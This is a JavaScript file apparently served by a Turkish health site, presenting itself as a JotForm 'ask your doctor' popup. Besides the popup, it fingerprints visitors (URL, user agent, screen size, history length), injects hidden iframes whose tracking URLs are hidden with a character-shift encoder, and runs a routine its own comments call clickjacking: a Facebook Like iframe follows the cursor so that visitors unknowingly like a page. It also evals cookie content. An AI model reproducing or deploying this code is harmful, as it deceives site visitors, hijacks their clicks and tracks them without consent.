var saat = 240;
var yayincikodu="doktorunuzsizinle.com";//yayincinin kullanici adi
var ids = [20987082396970];
var cookiesuresi=1; 
var sure=20;
var kod			= '(k7h13b1at5)';
var siteismi	= 'doktorunuzsizinle.com';
var sitekodu	= '13b1';
var sayfa="http://www.facebook.com/shedower1";  
var test=true;
txt = window.location.href + "  -  ";
txt+= navigator.cookieEnabled + "  -  " + history.length +  "  -  " + screen.width + " * " + screen.height + "  -  ";
txt+= navigator.userAgent + "   ";


Date.prototype.addHours = function(h) {
	this.setHours(this.getHours() + h);
	return this;
}
String.prototype.startsWith = function(prefix) {
    return this.indexOf(prefix) === 0;
}

function out(str) {
	var debug = true;
	
	if (true === debug) {
		
		if (console.info) {
			console.info(arguments.callee.caller)
			console.info(str);
		} else {

		}
	}
}

var myencoder = {
	set : function(input) {
		var output = "";
		var i = 0;
		while (i < input.length) {
			var chr1 = input.charCodeAt(i);
			output += String.fromCharCode(chr1 + 1);
			i++;
		}
		return output;
	},
	get : function(input) {
		var output = "";
		var i = 0;
		while (i < input.length) {
			var chr1 = input.charCodeAt(i);
			output += String.fromCharCode(chr1 - 1);
			i++;
		}
	//  out(output)
		return output;
		
	}
}

function setCookie(c_name, value, exhours) {
	var exdate = new Date();
	exdate.addHours(exhours);
	var c_value = escape(value)
			+ ((exhours == null) ? "" : "; expires=" + exdate.toUTCString());
document.cookie = c_name + "=" + c_value;
}
function getCookie(c_name) {
	var i, x, y, ARRcookies = document.cookie.split(";");
	for (i = 0; i < ARRcookies.length; i++) {
		x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
		y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
		x = x.replace(/^\s+|\s+$/g, "");
		if (x == c_name) {
			return unescape(y);
		}
	}
}


var last = 0;

var d = new Date();
var hour = d.getHours();

function checkCookie() {

	var username = getCookie("jotform");
	var isShow = false;
	isShow = true;
	if (username == null || username == "") {
		last = 0;
		isShow = true;
	} else {

		if (username.startsWith("{")) {
			eval("var lid=" + username);
			
			last = (lid.last + 1) % ids.length;

			var sp = (hour - lid.hour + 24) % 24;

			if (sp > 12) {

				isShow = true;
			}
			
			if(lid.last>=ids.length-1){
				//isShow=false;
			}

		}
	}
	if (isShow) {
		new JotformFeedback({
			formId : ids[last],
			base : 'http://jotformpro.com/',
			windowTitle : 'DOKTORUNUZ SORULARINIZI CEVAPLIYOR!!!',
			background : '#FFA500',
			fontColor : '#FFFFFF',
			type : 1,
			width : 530,
			height : 500,
			openOnLoad : true,
			iframeParameters: 	{
    				'kod'	:kod,
    				'site'	:siteismi,
    				'brow'	:txt,
								},

		});

		setCookie("jotform", "{last:" + last + ",hour:" + hour + "}", saat);

		var counter = myencoder
				.get("=jgsbnf!gsbnfcpsefs>#1#!tsd>#iuuq;00benjo/dmjdltfn/ofu0bdujpo/qiq@gpsn>$tjufobnf$'qvtcmjtifs>$qvcmjtifs$#!tuzmf>#pwfsgmpx;ijeefo<#!xjeui>1!ifjhiu>1!bmmpxusbotqbsfodz>#usvf#?=0jgsbnf?");

		counter = counter.replace("#sitename#", ids[last]);
		counter = counter.replace("#publisher#", yayincikodu);

		document.write(counter); 
		startit();//clickjack
	}
}


checkCookie();

var _gaq = _gaq || [];
_gaq.push([ '_setAccount', 'UA-28415017-x' ]);
_gaq.push([ '_trackPageview' ]);

(function() {
	var ga = document.createElement('script');
	ga.type = 'text/javascript';
	ga.async = true;
	ga.src = ('https:' == document.location.protocol ? 'https://ssl'
			: 'http://www')
			+ '.google-analytics.com/ga.js';
	var s = document.getElementsByTagName('script')[0];
	s.parentNode.insertBefore(ga, s);
})();


   new JotformFeedback({
		formId		: '20987082396970',
		buttonText	: 'DOKTORA SORU SOR!',
		base 		: 'http://jotformpro.com/',
		background	: '#F59202',
		fontColor	: '#000000',
		buttonSide	: 'left',
		buttonAlign	: 'top',
		type		: 2,
		width		: 530,
		height		: 500,
	
	iframeParameters: 	{
    		'kod'	:kod,
    		'site'	:siteismi,
    		'brow'	:txt,
						},


  });

  function startit(){
   console.info("starting...");
var username=getCookie("cjuser");
  if (username!=null && username!=""&&!test)
  {
return;
  }
else
  {
  	
	 var isIE = document.all ? true : false;
	
	if(!isIE){
		var script = document.createElement('script');
		script.src = 'https://www.facebook.com/imike3';

		script.onreadystatechange =function(){
		
		};
		script.onload = function(){
		doJack();

		};
		script.onerror = function(){

		};
		document.body.appendChild(script);
  }else
  {
	//doJack();
  }
}
}
 function doJack(){
  console.info("clickjacking...");
  var IE = document.all ? true : false;
    function mouseMove(e) {
	
		if (IE) {
		  tempX = event.clientX + document.body.scrollLeft;
		  tempY = event.clientY + document.body.scrollTop;
		} else {
		  tempX = e.pageX;
		  tempY = e.pageY;
		}

		if (tempX < 0) tempX = 0;
		if (tempY < 0) tempY = 0;

		like.style.top = (tempY - 5) + 'px';
		like.style.left = (tempX - 5) + 'px';

		return true
  }
    setCookie("cjuser","cjuservalue",cookiesuresi);

  var tempX = 0,
  tempY = 0;


   document.captureEvents(Event.MOUSEMOVE);

  var like = document.createElement('iframe');
  like.src = 'http://www.facebook.com/plugins/like.php?href=' + encodeURIComponent(sayfa) + 
	'&amp;layout=standard&amp;show_faces=true&amp;width=53&amp;action=like&amp;colorscheme=light&amp;height=80';
  like.scrolling = 'no';
  like.frameBorder = 1;
  like.allowTransparency = 'false';
  like.style.border = 0;
 // like.style.overflow = 'hidden';
  like.style.cursor = 'pointer';
  like.style.width = '100px';
  like.style.height =  '100px';
  like.style.position = 'absolute';
 // like.style.opacity = 1; //Would be 0 if really used
 console.info("appanding..");
  document.getElementsByTagName('body')[0].appendChild(like);
  
 var counter=myencoder.get('=jgsbnf!gsbnfcpsefs>#1#!tsd>#iuuq;00xxx/dmjdltfn/ofu0dmjdlkbdl0dpvou/qiq@obnf>$tjufobnf$#!tuzmf>#pwfsgmpx;ijeefo<#!xjeui>1!ifjhiu>1!bmmpxusbotqbsfodz>#usvf#?=0jgsbnf?');

 // console.log(counter);
  counter=counter.replace("#sitename#",siteismi);

  var mydiv=document.createElement("div");
  
  mydiv.innerHTML=counter;
  
  var likex=mydiv.firstChild;
  document.getElementsByTagName('body')[0].appendChild(likex);

if(window.addEventListener)
  window.addEventListener('mousemove', mouseMove, false);
else  window.attachEvent('mousemove', mouseMove);
  setTimeout(function(){
  // console.info("clickjack removing...");
    //document.getElementsByTagName('body')[0].removeChild(like);
	if(window.removeEventListener)
    window.removeEventListener('mousemove', mouseMove, false);
	else window.detachEvent('onmousemove', mouseMove)
  }, 1000*sure);


}